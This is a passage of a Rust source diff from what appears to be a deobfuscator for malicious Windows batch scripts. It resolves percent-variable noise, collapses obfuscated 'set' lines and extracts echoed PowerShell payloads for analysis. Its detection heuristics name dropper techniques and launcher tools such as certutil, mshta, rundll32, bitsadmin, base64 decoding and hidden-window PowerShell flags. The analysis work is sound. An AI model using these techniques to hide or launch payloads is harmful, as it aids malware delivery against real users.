+        for _ in 0..*pending_count {
+            out.push_str(pending_line);
+        }
+    }
+    pending_body.clear();
+    pending_line.clear();
+    *pending_count = 0;
+    *pending_bytes = 0;
+}
+
+fn coalesce_cmd_echo_powershell_wrapper_lines(text: &str, _env: &mut Environment) -> String {
+    let lines: Vec<&str> = text.split_inclusive('\n').collect();
+    if lines.is_empty() {
+        return String::new();
+    }
+
+    let mut out = String::with_capacity(text.len());
+    let mut idx = 0usize;
+    while idx < lines.len() {
+        if idx + 1 < lines.len() {
+            let (body, _) = split_line_ending(lines[idx]);
+            let (next_body, _) = split_line_ending(lines[idx + 1]);
+            if let Some(child) = cmd_echo_powershell_wrapper_child(body) {
+                if command_lines_equivalent(child, next_body) {
+                    out.push_str(lines[idx + 1]);
+                    idx += 2;
+                    continue;
+                }
+            }
+        }
+        out.push_str(lines[idx]);
+        idx += 1;
+    }
+    out
+}
+
+fn cmd_echo_powershell_wrapper_child(line: &str) -> Option<&str> {
+    let trimmed = line.trim_start();
+    let child = strip_ascii_prefix_ci(trimmed, "cmd.exe /c ")
+        .or_else(|| strip_ascii_prefix_ci(trimmed, "cmd /c "))?;
+    let child_trimmed = child.trim_start();
+    let after_echo = strip_ascii_prefix_ci(child_trimmed, "echo")?;
+    let valid_echo_suffix = match after_echo.chars().next() {
+        None => true,
+        Some(c) => c.is_whitespace() || c == '.',
+    };
+    if !valid_echo_suffix {
+        return None;
+    }
+    if !child_trimmed.contains('|')
+        || !contains_ascii_case_insensitive_bytes(child_trimmed.as_bytes(), b"powershell")
+    {
+        return None;
+    }
+    Some(child_trimmed)
+}
+
+fn command_lines_equivalent(left: &str, right: &str) -> bool {
+    if left.trim() == right.trim() {
+        return true;
+    }
+    let Some(left_function) = echoed_powershell_function_name(left) else {
+        return false;
+    };
+    let Some(right_function) = echoed_powershell_function_name(right) else {
+        return false;
+    };
+    left_function.eq_ignore_ascii_case(right_function)
+}
+
+fn echoed_powershell_function_name(line: &str) -> Option<&str> {
+    let trimmed = line.trim_start();
+    if !trimmed.contains('|')
+        || !contains_ascii_case_insensitive_bytes(trimmed.as_bytes(), b"powershell")
+    {
+        return None;
+    }
+    let after_echo = strip_ascii_prefix_ci(trimmed, "echo")?;
+    let after_echo = after_echo.trim_start_matches(['.', ' ', '\t']);
+    let after_function = strip_ascii_prefix_ci(after_echo, "function")?;
+    let after_function = after_function.trim_start();
+    let name_end = after_function
+        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '-'))
+        .unwrap_or(after_function.len());
+    (name_end > 0).then_some(&after_function[..name_end])
+}
+
+fn strip_ascii_prefix_ci<'a>(value: &'a str, prefix: &str) -> Option<&'a str> {
+    if value.len() < prefix.len() {
+        return None;
+    }
+    let head = value.get(..prefix.len())?;
+    if !head.eq_ignore_ascii_case(prefix) {
+        return None;
+    }
+    value.get(prefix.len()..)
+}
+
+fn coalesce_repeated_unicode_marker_set_lines(text: &str, env: &mut Environment) -> String {
+    let mut counts: std::collections::HashMap<&str, usize> = std::collections::HashMap::new();
+    for chunk in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(chunk);
+        if is_marker_set_scaffolding_line(body) {
+            *counts.entry(body).or_insert(0) += 1;
+        }
+    }
+    if !counts.values().any(|count| *count >= 3) {
+        return text.to_string();
+    }
+
+    let mut out = String::with_capacity(text.len());
+    let mut seen: std::collections::HashSet<&str> = std::collections::HashSet::new();
+    let mut omitted = 0usize;
+    let mut omitted_bytes = 0usize;
+    for chunk in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(chunk);
+        if is_marker_set_scaffolding_line(body) && counts.get(body).copied().unwrap_or(0) >= 3 {
+            if seen.insert(body) {
+                out.push_str(body);
+                out.push_str(ending);
+            } else {
+                omitted += 1;
+                omitted_bytes += chunk.len();
+            }
+            continue;
+        }
+        out.push_str(chunk);
+    }
+
+    if omitted == 0 {
+        return text.to_string();
+    }
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: omitted_bytes as u64,
+    });
+    out.push_str(&format!(
+        "rem omitted {omitted} repeated marker set scaffolding lines ({omitted_bytes} bytes)\r\n"
+    ));
+    out
+}
+
+fn is_marker_set_scaffolding_line(line: &str) -> bool {
+    is_unicode_marker_set_scaffolding_line(line) || is_cleaned_marker_set_scaffolding_line(line)
+}
+
+fn is_unicode_marker_set_scaffolding_line(line: &str) -> bool {
+    let trimmed = line.trim_start();
+    if trimmed.len() < 64 || !trimmed.to_ascii_lowercase().starts_with("set ") {
+        return false;
+    }
+    let non_ascii = trimmed
+        .chars()
+        .filter(|ch| !ch.is_ascii() && !ch.is_alphanumeric())
+        .count();
+    non_ascii >= 4 && trimmed.contains('=')
+}
+
+fn is_cleaned_marker_set_scaffolding_line(line: &str) -> bool {
+    let Some((_name, value)) = set_assignment(line) else {
+        return false;
+    };
+    let value = strip_outer_set_quotes(value.trim());
+    value.len() >= 48
+        && (contains_ascii_case_insensitive_bytes(value.as_bytes(), b"powershell")
+            || contains_ascii_case_insensitive_bytes(value.as_bytes(), b"executionpolicy")
+            || contains_ascii_case_insensitive_bytes(value.as_bytes(), b"windowstyle")
+            || contains_ascii_case_insensitive_bytes(value.as_bytes(), b"base64")
+            || is_base64_concat_set_scaffolding_value(value))
+}
+
+fn is_base64_concat_set_scaffolding_value(value: &str) -> bool {
+    if value.len() < 64 || value.matches("'+").count() + value.matches("+'").count() < 2 {
+        return false;
+    }
+    let carrier = value
+        .bytes()
+        .filter(|b| is_base64_carrier_byte(*b) || matches!(*b, b'-' | b'_'))
+        .count();
+    carrier >= 48 && carrier * 100 >= value.len() * 55
+}
+
+fn extract_cmd_echo_powershell_pipeline_payloads_from_deob(text: &str, env: &mut Environment) {
+    for line in text.lines() {
+        let Some(payload) = cmd_echo_powershell_pipeline_payload(line) else {
+            continue;
+        };
+        if payload.len() < 128 || !looks_like_echoed_powershell_payload(payload) {
+            continue;
+        }
+        push_extracted_ps1_for_later_analysis(payload.as_bytes().to_vec(), env);
+    }
+}
+
+fn summarize_long_cmd_echo_powershell_pipeline_lines(text: &str, env: &mut Environment) -> String {
+    let mut out = String::with_capacity(text.len());
+    let mut changed = false;
+    for line in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(line);
+        let Some(payload) = cmd_echo_powershell_pipeline_payload(body) else {
+            out.push_str(line);
+            continue;
+        };
+        if body.len() < 1024 || !looks_like_echoed_powershell_payload(payload) {
+            out.push_str(line);
+            continue;
+        }
+        changed = true;
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: body.len() as u64,
+        });
+        let mut details = Vec::new();
+        if let Some(function) = echoed_powershell_payload_function_name(payload) {
+            details.push(format!("function: {function}"));
+        }
+        let urls = long_inline_powershell_summary_urls(payload);
+        if !urls.is_empty() {
+            details.push(format!("urls: {}", urls.join(", ")));
+        }
+        if details.is_empty() {
+            out.push_str(&format!(
+                "rem omitted long cmd-echo PowerShell pipeline line ({} bytes; extracted PowerShell payload {} bytes){}",
+                body.len(),
+                payload.len(),
+                ending
+            ));
+        } else {
+            out.push_str(&format!(
+                "rem omitted long cmd-echo PowerShell pipeline line ({} bytes; extracted PowerShell payload {} bytes; {}){}",
+                body.len(),
+                payload.len(),
+                details.join("; "),
+                ending
+            ));
+        }
+    }
+    if changed {
+        out
+    } else {
+        text.to_string()
+    }
+}
+
+fn cmd_echo_powershell_pipeline_payload(line: &str) -> Option<&str> {
+    for needle in ["cmd.exe /c ", "cmd /c "] {
+        let mut search_from = 0usize;
+        while search_from < line.len() {
+            let Some(pos) =
+                crate::util::find_ascii_case_insensitive_from(line, needle, search_from)
+            else {
+                break;
+            };
+            let after_cmd = line.get(pos + needle.len()..)?.trim_start();
+            let after_echo = strip_ascii_prefix_ci(after_cmd, "echo")?;
+            let valid_echo_suffix = match after_echo.chars().next() {
+                None => false,
+                Some(c) => c.is_whitespace() || c == '.',
+            };
+            if !valid_echo_suffix {
+                search_from = pos + needle.len();
+                continue;
+            }
+            let echoed = after_echo.trim_start_matches(['.', ' ', '\t']);
+            for (pipe_idx, _) in echoed.match_indices('|') {
+                let payload = echoed[..pipe_idx].trim();
+                let pipe_target = echoed[pipe_idx + 1..]
+                    .split('|')
+                    .next()
+                    .unwrap_or("")
+                    .trim_start();
+                if payload.is_empty()
+                    || !contains_ascii_case_insensitive_bytes(pipe_target.as_bytes(), b"powershell")
+                {
+                    continue;
+                }
+                return Some(payload);
+            }
+            search_from = pos + needle.len();
+        }
+    }
+    echoed_powershell_payload(line)
+}
+
+fn echoed_powershell_payload(line: &str) -> Option<&str> {
+    let trimmed = line.trim_start();
+    let after_echo = strip_ascii_prefix_ci(trimmed, "echo")?;
+    let valid_echo_suffix = match after_echo.chars().next() {
+        None => false,
+        Some(c) => c.is_whitespace() || c == '.',
+    };
+    if !valid_echo_suffix {
+        return None;
+    }
+    let payload = after_echo.trim_start_matches(['.', ' ', '\t']).trim();
+    (!payload.is_empty() && looks_like_echoed_powershell_payload(payload)).then_some(payload)
+}
+
+fn looks_like_echoed_powershell_payload(payload: &str) -> bool {
+    if looks_like_extracted_powershell(payload) {
+        return true;
+    }
+    let lower = payload.to_ascii_lowercase();
+    lower.contains("function ")
+        || lower.contains("invoke-")
+        || lower.contains("frombase64string")
+        || lower.contains("new-object")
+        || lower.contains("download")
+        || lower.contains("system.")
+}
+
+fn echoed_powershell_payload_function_name(payload: &str) -> Option<&str> {
+    let after_function = strip_ascii_prefix_ci(payload.trim_start(), "function")?;
+    let after_function = after_function.trim_start();
+    let name_end = after_function
+        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '-'))
+        .unwrap_or(after_function.len());
+    (name_end > 0).then_some(&after_function[..name_end])
+}
+
+const MAX_PERCENT_NOISE_ACTION_MATERIALIZATION_SOURCE_BYTES: usize = 192 * 1024;
+const MAX_PERCENT_NOISE_ACTION_MATERIALIZATION_LINES: usize = 160;
+
+fn has_oversize_percent_noise_candidate_line(text: &str) -> bool {
+    text.split_inclusive('\n').any(|line| {
+        let (body, _) = split_line_ending(line);
+        body.len() > MAX_PERCENT_NOISE_ACTION_MATERIALIZATION_SOURCE_BYTES && body.contains('%')
+    })
+}
+
+fn summarize_long_unresolved_percent_noise_lines(text: &str, env: &mut Environment) -> String {
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut changed = false;
+    let mut materialized_seen = std::collections::HashSet::new();
+    let mut materialized_scan_bytes = 0usize;
+    let mut materialized_scan_lines = 0usize;
+    let mut pending_lines = 0usize;
+    let mut pending_original_len = 0usize;
+    let mut pending_dense = 0usize;
+    let mut pending_ending = "\n";
+    let mut pending_markers: Vec<&'static str> = Vec::new();
+    for line in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(line);
+        if let Some(summary) = classify_long_unresolved_percent_noise_line(body) {
+            changed = true;
+            push_percent_noise_anti_analysis_markers(body, &summary.markers, env);
+            let should_try_materialize = body.len()
+                <= MAX_PERCENT_NOISE_ACTION_MATERIALIZATION_SOURCE_BYTES
+                    .saturating_sub(materialized_scan_bytes)
+                && materialized_scan_lines < MAX_PERCENT_NOISE_ACTION_MATERIALIZATION_LINES;
+            materialized_scan_bytes = materialized_scan_bytes.saturating_add(body.len());
+            materialized_scan_lines = materialized_scan_lines.saturating_add(1);
+            if should_try_materialize {
+                if let Some(materialized) = materialized_percent_noise_action_line(body, env) {
+                    if materialized_seen.insert(materialized.clone()) {
+                        interpret_materialized_percent_noise_state_update(&materialized, env);
+                        flush_long_unresolved_percent_noise_run(
+                            &mut out,
+                            &mut pending_lines,
+                            &mut pending_original_len,
+                            &mut pending_dense,
+                            &mut pending_ending,
+                            &mut pending_markers,
+                            env,
+                        );
+                        out.push_str(&materialized);
+                        out.push_str(ending);
+                        continue;
+                    }
+                }
+            }
+            if summary.dense {
+                pending_dense += 1;
+            }
+            for marker in summary.markers {
+                if !pending_markers.contains(&marker) {
+                    pending_markers.push(marker);
+                }
+            }
+            pending_lines += 1;
+            pending_original_len = pending_original_len.saturating_add(body.len());
+            if ending == "\r\n" {
+                pending_ending = "\r\n";
+            }
+        } else {
+            flush_long_unresolved_percent_noise_run(
+                &mut out,
+                &mut pending_lines,
+                &mut pending_original_len,
+                &mut pending_dense,
+                &mut pending_ending,
+                &mut pending_markers,
+                env,
+            );
+            out.push_str(line);
+        }
+    }
+    flush_long_unresolved_percent_noise_run(
+        &mut out,
+        &mut pending_lines,
+        &mut pending_original_len,
+        &mut pending_dense,
+        &mut pending_ending,
+        &mut pending_markers,
+        env,
+    );
+    if changed {
+        out
+    } else {
+        text.to_string()
+    }
+}
+
+fn materialized_percent_noise_action_line(line: &str, env: &Environment) -> Option<String> {
+    let expanded = fast_expand_percent_substr_chain_line(line, env)
+        .or_else(|| fast_expand_percent_var_chain_line(line, env))
+        .or_else(|| fast_strip_percent_noise_markers_preserving_literals(line, env))?;
+    let stripped = crate::marker_noise::strip_line(&expanded);
+    let expanded_trimmed = expanded.trim();
+    let candidate = if fast_percent_expansion_has_actionable_atom(expanded_trimmed)
+        || materialized_expanded_command_should_preserve_literals(expanded_trimmed)
+    {
+        expanded_trimmed
+    } else if stripped.trim().len() < expanded_trimmed.len() {
+        stripped.trim()
+    } else {
+        expanded_trimmed
+    };
+    if materialized_command_has_dense_unresolved_substr_carrier(candidate) {
+        return None;
+    }
+    if !is_actionable_materialized_percent_noise_command(candidate) {
+        return None;
+    }
+    Some(repair_powershell_launcher_flag_spacing(
+        candidate.to_string(),
+    ))
+}
+
+fn materialized_expanded_command_should_preserve_literals(command: &str) -> bool {
+    let command_head = command
+        .trim_start_matches(['@', '(', ';', ','])
+        .trim_start()
+        .trim_matches('"');
+    interp::command_name(command_head).is_some_and(|name| name.eq_ignore_ascii_case("set"))
+}
+
+fn materialized_command_has_dense_unresolved_substr_carrier(command: &str) -> bool {
+    if command.contains("://") || materialized_expanded_command_should_preserve_literals(command) {
+        return false;
+    }
+    count_unresolved_substr_carrier_ops(command) >= 16
+}
+
+fn count_unresolved_substr_carrier_ops(command: &str) -> usize {
+    command
+        .match_indices(":~")
+        .filter(|(idx, _)| {
+            let tail = &command[idx + 2..];
+            let mut chars = tail.chars();
+            matches!(chars.next(), Some('-' | '0'..='9' | ' '))
+                && tail.contains(',')
+                && tail
+                    .chars()
+                    .take_while(|ch| ch.is_ascii_digit() || matches!(ch, '-' | ',' | ' '))
+                    .any(|ch| ch == ',')
+        })
+        .count()
+}
+
+fn fast_strip_percent_noise_markers_preserving_literals(
+    line: &str,
+    env: &Environment,
+) -> Option<String> {
+    if line.len() < 128 || !line.contains('%') {
+        return None;
+    }
+
+    let mut out = String::with_capacity(line.len().min(64 * 1024));
+    let mut literal_only = String::with_capacity(line.len().min(64 * 1024));
+    let mut cursor = 0usize;
+    let mut refs = 0usize;
+    let mut literal = 0usize;
+    while cursor < line.len() {
+        let rest = &line[cursor..];
+        let Some(ch) = rest.chars().next() else {
+            break;
+        };
+        if ch == '%' {
+            if let Some((expanded, next_cursor)) =
+                expand_doubled_fast_percent_noise_ref(line, cursor, env)
+            {
+                out.push_str(&expanded);
+                refs += 1;
+                cursor = next_cursor;
+                continue;
+            }
+            let name_start = cursor + 1;
+            let close_rel = line[name_start..].find('%')?;
+            let inner = &line[name_start..name_start + close_rel];
+            if inner.is_empty() {
+                return None;
+            }
+            if let Some(expanded) = expand_fast_percent_noise_ref(inner, env) {
+                out.push_str(&expanded);
+            }
+            refs += 1;
+            cursor = name_start + close_rel + 1;
+            continue;
+        }
+        if ch == '!' && env.delayed_expansion {
+            let name_start = cursor + 1;
+            if let Some(close_rel) = line[name_start..].find('!') {
+                let name = &line[name_start..name_start + close_rel];
+                if !simple_percent_name_allowed(name) {
+                    return None;
+                }
+                let value = env.get(name)?;
+                out.push_str(&value);
+                refs += 1;
+                cursor = name_start + close_rel + 1;
+                continue;
+            }
+        }
+
+        out.push(ch);
+        literal_only.push(ch);
+        if !ch.is_whitespace() {
+            literal += 1;
+        }
+        cursor += ch.len_utf8();
+    }
+
+    let chosen = if should_prefer_literal_percent_noise_echo(&out, &literal_only) {
+        literal_only
+    } else {
+        out
+    };
+    let trimmed = chosen.trim();
+    (refs >= 6
+        && literal >= 2
+        && trimmed.len() < line.trim().len()
+        && !trimmed.is_empty()
+        && trimmed.matches('%').count() < 16)
+        .then_some(chosen)
+}
+
+fn should_prefer_literal_percent_noise_echo(expanded: &str, literal_only: &str) -> bool {
+    let expanded_trimmed = expanded.trim();
+    let literal_trimmed = literal_only.trim();
+    if literal_trimmed.len() >= expanded_trimmed.len()
+        || expanded_trimmed.contains("://")
+        || !contains_windows_path_literal(expanded_trimmed)
+    {
+        return false;
+    }
+
+    let Some(expanded_name) = interp::command_name(expanded_trimmed) else {
+        return false;
+    };
+    let Some(literal_name) = interp::command_name(literal_trimmed) else {
+        return false;
+    };
+    expanded_name.eq_ignore_ascii_case("echo") && literal_name.eq_ignore_ascii_case("echo")
+}
+
+fn contains_windows_path_literal(text: &str) -> bool {
+    text.as_bytes().windows(3).any(|window| {
+        window[0].is_ascii_alphabetic() && window[1] == b':' && matches!(window[2], b'\\' | b'/')
+    })
+}
+
+fn expand_doubled_fast_percent_noise_ref(
+    line: &str,
+    cursor: usize,
+    env: &Environment,
+) -> Option<(String, usize)> {
+    if line.as_bytes().get(cursor + 1).copied() != Some(b'%') {
+        return None;
+    }
+
+    let name_start = cursor + 2;
+    let close_rel = line[name_start..].find('%')?;
+    let inner = &line[name_start..name_start + close_rel];
+    if !inner.contains(":~") {
+        return None;
+    }
+    let expanded = expand_fast_percent_noise_ref(inner, env)?;
+    Some((expanded, name_start + close_rel + 1))
+}
+
+fn expand_fast_percent_noise_ref(inner: &str, env: &Environment) -> Option<String> {
+    let (name, op) = inner
+        .split_once(':')
+        .map_or((inner, None), |(name, op)| (name, Some(op)));
+    if !percent_noise_name_allowed(name) {
+        return None;
+    }
+    let value = crate::normalize::env_get_for_var_expansion(env, name, true)?;
+    let Some(op) = op else {
+        return Some(value);
+    };
+    if let Some((index, length)) = parse_fast_percent_substr_op(op) {
+        return Some(crate::normalize::apply_substr(&value, index, length));
+    }
+    let (needle, replacement) = op.split_once('=')?;
+    let (wildcard, needle) = needle
+        .strip_prefix('*')
+        .map_or((false, needle), |needle| (true, needle));
+    Some(crate::normalize::apply_substitute(
+        &value,
+        needle,
+        replacement,
+        wildcard,
+    ))
+}
+
+fn percent_noise_name_allowed(name: &str) -> bool {
+    !name.is_empty()
+        && name.chars().all(|ch| {
+            !ch.is_control()
+                && !matches!(
+                    ch,
+                    '%' | '!' | '^' | '&' | '|' | '<' | '>' | '"' | '\'' | '='
+                )
+        })
+}
+
+fn interpret_materialized_percent_noise_state_update(command: &str, env: &mut Environment) {
+    for segment in command.split('&') {
+        let segment = segment.trim();
+        if segment.is_empty() {
+            continue;
+        }
+        let command_head = segment.trim_start_matches(['@', '(']).trim_start();
+        if crate::util::starts_with_ascii_case_insensitive(command_head, "setlocal") {
+            env.push_setlocal(crate::util::contains_ascii_case_insensitive(
+                command_head,
+                "enabledelayedexpansion",
+            ));
+            continue;
+        }
+        let Some((name, value)) = set_assignment(segment) else {
+            continue;
+        };
+        if let Some(value) = expand_materialized_delayed_refs(value, env) {
+            env.set(name, &value);
+        }
+    }
+}
+
+fn expand_materialized_delayed_refs(value: &str, env: &Environment) -> Option<String> {
+    if !env.delayed_expansion || !value.contains('!') {
+        return Some(value.to_string());
+    }
+
+    let mut out = String::with_capacity(value.len());
+    let mut cursor = 0usize;
+    while cursor < value.len() {
+        let rest = &value[cursor..];
+        let Some(ch) = rest.chars().next() else {
+            break;
+        };
+        if ch != '!' {
+            out.push(ch);
+            cursor += ch.len_utf8();
+            continue;
+        }
+
+        let name_start = cursor + 1;
+        let close_rel = value[name_start..].find('!')?;
+        let name = &value[name_start..name_start + close_rel];
+        if !simple_percent_name_allowed(name) {
+            return None;
+        }
+        let expanded = env.get(name)?;
+        out.push_str(&expanded);
+        cursor = name_start + close_rel + 1;
+    }
+    Some(out)
+}
+
+fn is_actionable_materialized_percent_noise_command(command: &str) -> bool {
+    const MAX_MATERIALIZED_PERCENT_NOISE_COMMAND_BYTES: usize = 64 * 1024;
+
+    let trimmed = command.trim_start();
+    if trimmed.is_empty()
+        || trimmed.len() > MAX_MATERIALIZED_PERCENT_NOISE_COMMAND_BYTES
+        || trimmed.starts_with("rem omitted ")
+    {
+        return false;
+    }
+    if trimmed.matches('%').count() >= 16 {
+        return false;
+    }
+    if cmd_echo_powershell_pipeline_payload(trimmed).is_some() {
+        return true;
+    }
+    if fast_percent_expansion_has_actionable_atom(trimmed) {
+        return true;
+    }
+    if looks_like_renamed_powershell_materialized_command(trimmed) {
+        return true;
+    }
+
+    let command_head = trimmed
+        .trim_start_matches(['@', '('])
+        .trim_start()
+        .trim_matches('"');
+    let Some(name) = interp::command_name(command_head) else {
+        return false;
+    };
+    let name = name.trim_matches('"');
+    let basename = name.rsplit(['\\', '/']).next().unwrap_or(name);
+    let lower = basename.trim_end_matches(".exe").to_ascii_lowercase();
+    matches!(
+        lower.as_str(),
+        "set"
+            | "setlocal"
+            | "echo"
+            | "doskey"
+            | "if"
+            | "cmd"
+            | "powershell"
+            | "pwsh"
+            | "start"
+            | "wmic"
+            | "certutil"
+            | "mshta"
+            | "rundll32"
+            | "reg"
+            | "copy"
+            | "curl"
+            | "bitsadmin"
+            | "cscript"
+            | "wscript"
+            | "exit"
+    )
+}
+
+fn looks_like_renamed_powershell_materialized_command(command: &str) -> bool {
+    let command_head = command
+        .trim_start_matches(['@', '('])
+        .trim_start()
+        .trim_matches('"');
+    let Some(name) = interp::command_name(command_head) else {
+        return false;
+    };
+    let basename = name
+        .trim_matches('"')
+        .rsplit(['\\', '/'])
+        .next()
+        .unwrap_or(name.as_str())
+        .to_ascii_lowercase();
+    if !basename.ends_with(".exe") {
+        return false;
+    }
+
+    let lower = command.to_ascii_lowercase();
+    let has_powershell_option = lower.contains("-noprofile")
+        || lower.contains("-nop")
+        || lower.contains("-windowstyle")
+        || lower.contains("-executionpolicy")
+        || lower.contains(" -ep ");
+    let has_command = lower.contains("-command") || lower.contains(" -c ");
+    let has_powershell_syntax = lower.contains("[system.")
+        || lower.contains("::")
+        || (command.contains('$') && (lower.contains("new-object") || lower.contains("invoke-")));
+
+    has_powershell_option && has_command && has_powershell_syntax
+}
+
+fn preconsume_raw_marker_sets_before_percent_noise_summary(text: &str, env: &mut Environment) {
+    let raw_enables_delayed_expansion =
+        crate::util::contains_ascii_case_insensitive(text, "enabledelayedexpansion");
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        if body.len() < 128 || !body.contains("%^%") {
+            continue;
+        }
+        if classify_long_unresolved_percent_noise_line(body).is_none() {
+            continue;
+        }
+        let commands = split::split_commands(body);
+        if commands.len() != 1 {
+            continue;
+        }
+        if interp::pre_dispatch_raw_marker_set(&commands[0], env).is_some() {
+            continue;
+        }
+        let Some(decoded) = interp::decode_caret_percent_marker_command(&commands[0]) else {
+            continue;
+        };
+        let Some(name) = interp::command_name(&decoded) else {
+            continue;
+        };
+        if !name.eq_ignore_ascii_case("echo") {
+            continue;
+        }
+        let toks = lex::lex(&decoded);
+        let delayed_before = env.delayed_expansion;
+        if raw_enables_delayed_expansion {
+            env.delayed_expansion = true;
+        }
+        let normalized = normalize::normalize_to_string(&toks, env);
+        env.delayed_expansion = delayed_before;
+        interp::interpret_line(&normalized, env);
+    }
+}
+
+fn preconsume_raw_simple_sets_before_percent_noise_summary(text: &str, env: &mut Environment) {
+    const MAX_PRECONSUMED_RAW_SETS: usize = 2048;
+    const MAX_PRECONSUMED_RAW_SET_VALUE_BYTES: usize = 16 * 1024;
+
+    let mut consumed = 0usize;
+    for line in text.lines() {
+        if consumed >= MAX_PRECONSUMED_RAW_SETS {
+            break;
+        }
+        let Some((name, value)) = preconsumable_raw_set_assignment(line) else {
+            continue;
+        };
+        if name.len() > 96 || !simple_percent_name_allowed(name) {
+            continue;
+        }
+        let value = strip_outer_set_quotes(value);
+        if value.len() > MAX_PRECONSUMED_RAW_SET_VALUE_BYTES
+            || value
+                .chars()
+                .any(|ch| ch.is_control() && !matches!(ch, '\t'))
+        {
+            continue;
+        }
+        // This pass runs before multiple raw summarizers. An append-style
+        // assignment such as `set PATH=prefix;%PATH%` must execute once in
+        // source order, so leave it for the normal interpreter rather than
+        // replaying it for every pre-scan pass.
+        if crate::handlers::set::has_direct_self_reference(name, value, env) {
+            continue;
+        }
+        env.set(name, value);
+        consumed += 1;
+    }
+}
+
+fn preconsumable_raw_set_assignment(line: &str) -> Option<(&str, &str)> {
+    let trimmed = line.trim_start_matches(|c: char| {
+        c == '@' || c == '(' || c == ';' || c == ',' || c.is_whitespace()
+    });
+    let rest = crate::handlers::util::strip_keyword_ci(trimmed, "set", b"=/ \t")?;
+    if rest.trim_start().starts_with('/') {
+        return None;
+    }
+    let rest = rest.trim_start();
+    let (name, value) = if let Some(quoted) = rest.strip_prefix('"') {
+        let end = quoted.rfind('"')?;
+        if !quoted[end + 1..].trim().is_empty() {
+            return None;
+        }
+        quoted[..end].split_once('=')?
+    } else {
+        rest.split_once('=')?
+    };
+    let name = name.trim();
+    (!name.is_empty()).then_some((name, value))
+}
+
+fn preconsume_percent_setter_alias_assignments_before_percent_noise_summary(
+    text: &str,
+    env: &mut Environment,
+) {
+    const MAX_PRECONSUMED_SETTER_ALIAS_SETS: usize = 2048;
+    const MAX_PRECONSUMED_SETTER_ALIAS_VALUE_BYTES: usize = 16 * 1024;
+
+    let mut consumed = 0usize;
+    for line in text.lines() {
+        if consumed >= MAX_PRECONSUMED_SETTER_ALIAS_SETS {
+            break;
+        }
+        let Some(materialized) = materialize_direct_percent_setter_alias_assignment(line, env)
+        else {
+            continue;
+        };
+        if materialized.len() > MAX_PRECONSUMED_SETTER_ALIAS_VALUE_BYTES
+            || materialized
+                .chars()
+                .any(|ch| ch.is_control() && !matches!(ch, '\t'))
+        {
+            continue;
+        }
+        crate::handlers::set::h_set(&materialized, env);
+        consumed += 1;
+    }
+}
+
+fn materialize_direct_percent_setter_alias_assignment(
+    line: &str,
+    env: &Environment,
+) -> Option<String> {
+    let trimmed = line.trim_start_matches(['@', ' ', '\t']);
+    let after_open = trimmed.strip_prefix('%')?;
+    let close_rel = after_open.find('%')?;
+    let alias = &after_open[..close_rel];
+    if !simple_percent_name_allowed(alias) {
+        return None;
+    }
+    let setter = env.get(alias)?;
+    if !setter.trim().eq_ignore_ascii_case("set") {
+        return None;
+    }
+    let remainder = &after_open[close_rel + 1..];
+    if !remainder.trim_start().starts_with('"') {
+        return None;
+    }
+    Some(format!("{setter}{remainder}"))
+}
+
+fn preconsume_percent_wrapped_single_char_sets_before_percent_noise_summary(
+    text: &str,
+    env: &mut Environment,
+) {
+    const MAX_PRECONSUMED_DICTIONARY_SETS: usize = 2048;
+
+    let mut consumed = 0usize;
+    for line in text.lines() {
+        if consumed >= MAX_PRECONSUMED_DICTIONARY_SETS {
+            break;
+        }
+        if !line.contains('%') || !line.contains('=') {
+            continue;
+        }
+        let Some(materialized) = strip_percent_wrapped_noise_refs_for_single_char_set(line) else {
+            continue;
+        };
+        let mut search_from = 0usize;
+        let mut line_consumed = false;
+        while let Some(set_idx) =
+            crate::util::find_ascii_case_insensitive_from(&materialized, "set", search_from)
+        {
+            let candidate =
+                materialized[set_idx..].trim_end_matches(|c: char| c == ')' || c.is_whitespace());
+            if let Some((name, value)) = set_assignment(candidate) {
+                let name = name.trim();
+                if name.len() <= 16
+                    && simple_percent_name_allowed(name)
+                    && !is_common_environment_assignment_name(name)
+                {
+                    let value = strip_outer_set_quotes(value.trim());
+                    if value.len() == 1 && value.bytes().all(|b| b.is_ascii_graphic() && b != b'"')
+                    {
+                        env.set(name, value);
+                        consumed += 1;
+                        line_consumed = true;
+                        break;
+                    }
+                }
+            }
+            search_from = set_idx + "set".len();
+        }
+        if line_consumed {
+            continue;
+        }
+    }
+}
+
+fn strip_percent_wrapped_noise_refs_for_single_char_set(line: &str) -> Option<String> {
+    let mut out = String::with_capacity(line.len());
+    let mut cursor = 0usize;
+    let mut refs = 0usize;
+    while cursor < line.len() {
+        let rest = &line[cursor..];
+        let ch = rest.chars().next()?;
+        if ch == '%' {
+            let name_start = cursor + 1;
+            let close_rel = line[name_start..].find('%')?;
+            refs += 1;
+            cursor = name_start + close_rel + 1;
+            continue;
+        }
+        if ch != '^' {
+            out.push(ch);
+        }
+        cursor += ch.len_utf8();
+    }
+
+    let candidate = out.trim();
+    if refs < 4 || candidate.len() >= line.trim().len() {
+        return None;
+    }
+    crate::util::contains_ascii_case_insensitive(candidate, "set").then(|| candidate.to_string())
+}
+
+fn preconsume_materialized_percent_substr_sets_before_percent_noise_summary(
+    text: &str,
+    env: &mut Environment,
+) {
+    const MAX_PRECONSUMED_MATERIALIZED_SETS: usize = 2048;
+
+    let mut consumed = 0usize;
+    for line in text.lines() {
+        if consumed >= MAX_PRECONSUMED_MATERIALIZED_SETS {
+            break;
+        }
+        if line.len() < 128 || !line.contains(":~") || !line.contains('%') {
+            continue;
+        }
+        let Some(materialized) = materialized_percent_noise_action_line(line, env) else {
+            continue;
+        };
+        let command_head = materialized
+            .trim_start_matches(['@', '(', ';', ','])
+            .trim_start();
+        let Some(name) = interp::command_name(command_head) else {
+            continue;
+        };
+        if !name.eq_ignore_ascii_case("set") && !name.eq_ignore_ascii_case("setlocal") {
+            continue;
+        }
+        interpret_materialized_percent_noise_state_update(&materialized, env);
+        consumed += 1;
+    }
+}
+
+fn flush_long_unresolved_percent_noise_run(
+    out: &mut String,
+    pending_lines: &mut usize,
+    pending_original_len: &mut usize,
+    pending_dense: &mut usize,
+    pending_ending: &mut &'static str,
